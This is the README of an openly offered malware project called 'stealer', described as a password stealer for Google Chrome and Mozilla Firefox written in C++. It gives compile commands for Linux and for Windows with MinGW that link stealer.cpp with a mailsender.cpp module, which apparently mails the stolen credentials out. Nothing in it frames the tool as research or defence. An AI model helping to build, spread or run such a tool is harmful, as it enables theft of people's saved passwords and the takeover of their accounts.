# stealer

Password stealer for Google Chrome and Mozilla Firefox written in C++.

You can compile it for Linux using commands below:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp mailsender.cpp sqlite3.o -ldl -pthread -lstdc++fs
```
  
And for Windows you have to execute following commands using MinGW:
```
gcc -c sqlite3.c
g++ -o <programname> stealer.cpp mailsender.cpp sqlite3.o -lstdc++fs -lcrypt32
```
